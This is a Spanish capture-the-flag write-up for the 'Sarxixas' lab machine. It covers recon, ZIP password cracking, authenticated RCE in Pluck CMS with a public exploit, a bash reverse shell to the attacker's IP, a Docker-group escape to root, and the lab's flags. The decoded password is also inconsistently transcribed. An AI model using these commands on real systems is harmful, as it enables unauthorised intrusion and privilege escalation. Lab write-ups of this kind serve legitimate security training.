# 🎯 Sarxixas - The Hackers Labs

![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-orange) ![Platform: The Hackers Labs](https://img.shields.io/badge/Platform-The%20Hackers%20Labs-blue) ![OS: Linux](https://img.shields.io/badge/OS-Linux-red)

## 📌 **Descripción General**
**Sarxixas** es una máquina virtual diseñada para el aprendizaje y práctica de técnicas de **pentesting** en entornos Linux. La máquina explota vulnerabilidades comunes como **RCE en Pluck CMS**, **cracking de archivos ZIP**, **escalada de privilegios mediante Docker** y **movimiento lateral**.

🔹 **Plataforma:** [The Hackers Labs](https://thehackerslabs.com)
🔹 **Sistema Operativo:** Linux (Debian)
🔹 **Dificultad:** Media-Alta

---

## 🏷️ **Etiquetas**
`Linux` | `Pluck CMS` | `RCE` | `Zip Cracking` | `John the Ripper` | `Base58` | `Docker` | `Group Permission`

---

## 🛠️ **Instalación**
1. **Descargar la OVA:**
   - Obtener el archivo `.zip` que contiene la máquina virtual desde [The Hackers Labs](https://thehackerslabs.com).
   - Extraer el contenido.

2. **Importar en VirtualBox:**
   - Abrir **VirtualBox** y seleccionar `Archivo > Importar servicio...`.
   - Elegir la OVA extraída y configurar la máquina virtual.

3. **Configurar la red:**
   - Asegurarse de que la máquina atacante (Kali Linux) y la víctima (Sarxixas) estén en la misma red.
   - Configurar la interfaz de red de Sarxixas en modo **NAT** o **Host-Only** según la topología deseada.

4. **Iniciar la máquina:**
   - Encender ambas máquinas y verificar la conectividad con `ping`.

---

## 🔍 **Reconocimiento de Hosts**
Identificar la IP de la máquina víctima (`10.0.4.92`) usando **netdiscover**:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

📌 **Resultado:**
```
IP: 10.0.4.92 | MAC: 08:00:27:80:8c:91 | Vendor: PCS Systemtechnik GmbH
```

---

## 🌐 **Escaneo de Puertos**
Realizar un escaneo con **Nmap** para identificar servicios activos:

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.92
nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.92
```

📌 **Puertos abiertos:**
| Puerto | Servicio       | Versión                     |
|--------|----------------|-----------------------------|
| 22     | SSH            | OpenSSH 9.2p1 Debian        |
| 80     | HTTP           | Apache 2.4.57 + Pluck CMS 4.7.13 |

🔹 **Añadir al `/etc/hosts`:**
```bash
10.0.4.92   sarxixas.thl
```

---

## 🔓 **Explotación (RCE en Pluck CMS)**
### **1. Vulnerabilidad:**
- **Pluck CMS 4.7.13** es vulnerable a **File Upload RCE (Authenticated)**.
- Requiere credenciales de administrador.

### **2. Enumeración de Directorios:**
Usar **Gobuster** para descubrir rutas:
```bash
gobuster dir -u http://sarxixas.thl -w /usr/share/seclists/Discovery/Web-Content/...
```
📌 **Directorios interesantes:**
- `/api/` → Contiene `HostiaPilotes.zip` (protegido con contraseña).

### **3. Cracking del ZIP:**
```bash
zip2john HostiaPilotes.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
🔑 **Contraseña:** `babybaby`
📌 **Contenido:** `ElAbueloDeLaAnitta` (credenciales de admin en Pluck).

### **4. Explotación con Python:**
```bash
python3 49909.py sarxixas.thl 80 ElAbueloDeLaAnitta /
```
📌 **Webshell subida a:** `http://sarxixas.thl/files/shell.phar`

### **5. Reverse Shell:**
```bash
# En la máquina atacante:
sudo nc -nlvp 4444

# En la webshell:
bash -c 'bash -i >& /dev/tcp/10.0.4.12/4444 0>&1'
```
📌 **Shell obtenida:** `www-data@sarxixas`

### **6. Tratamiento de TTY:**
```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

---

## 🔄 **Movimiento Lateral**
### **1. Descubrimiento de Archivos:**
- En `/opt/` se encuentra `edropedropedrooo.zip`.

### **2. Transferencia y Cracking:**
```bash
# En la víctima:
python3 -m http.server 4443

# En la atacante:
wget http://sarxixas.thl:4443/edropedropedrooo.zip

zip2john edropedropedrooo.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
🔑 **Contraseña:** `cassandra`
📌 **Contenido:** `3HBRD7XyxF5gAbkMmnWdW` (codificado en **Base58**).

### **3. Decodificación Base58:**
```bash
echo '3HBRD7XyxF5gAbkMmnWdW' | base58 -d
```
🔑 **Contraseña decodificada:** `Quepasaolvidona` → `uepasaolvidona` (variación).

### **4. Acceso como `sarxixa`:**
```bash
su sarxixa
```

---

## 🚀 **Escalada de Privilegios**
### **1. Verificación de Grupos:**
```bash
id
```
📌 **Grupos:** `docker` (clave para escalada).

### **2. Explotación con Docker:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```
🔑 **Acceso como `root` obtenido.**

### **3. Obtención de Flags:**
```bash
cat /home/sarxixa/user.txt
cat /root/root.txt
```
📌 **Flags:**
- **User:** `d7a4cf4ac8cbabd2adcfde5b883ecf06`
- **Root:** `e84b0c633b9749b00eace3483a09c49c`

---

## 🎯 **Resumen de Ataques**
| Técnica               | Herramienta/Comando                     | Resultado                     |
|-----------------------|----------------------------------------|-------------------------------|
| **Reconocimiento**    | `netdiscover`, `nmap`                  | IP: `10.0.4.92`, puertos 22/80 |
| **Fuzzing Web**       | `gobuster`                             | `/api/`, `/admin.php`         |
| **Cracking ZIP**      | `zip2john`, `john`                     | Contraseñas: `babybaby`, `cassandra` |
| **RCE**               | Exploit 49909.py                       | Shell como `www-data`         |
| **Movimiento Lateral**| `base58`, `su`                         | Acceso como `sarxixa`         |
| **Escalada**          | `docker`                               | Acceso como `root`            |

---

## 📚 **Recursos Utilizados**
- **Herramientas:** Nmap, netdiscover, Gobuster, John the Ripper, zip2john, Docker.
- **Exploits:** [Pluck CMS 4.7.13 RCE (49909.py)](https://www.exploit-db.com/exploits/49909).
- **Diccionarios:** `rockyou.txt`, `DirBuster-2007_directory-list-2.3-medium.txt`.
- **Codificación:** Base58.

---

## 🏆 **Flags**
```bash
User Flag:   d7a4cf4ac8cbabd2adcfde5b883ecf06
Root Flag:   e84b0c633b9749b00eace3483a09c49c
```

---
🔥 **¡Felicidades! Has completado la máquina Sarxixas.** 🔥
💡 *¿Quieres más retos?* Visita [The Hackers Labs](https://thehackerslabs.com) para más CTFs y laboratorios.

---
**📌 Autor:** [The Hackers Labs](https://thehackerslabs.com)
**📌 Licencia:** [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/)
```
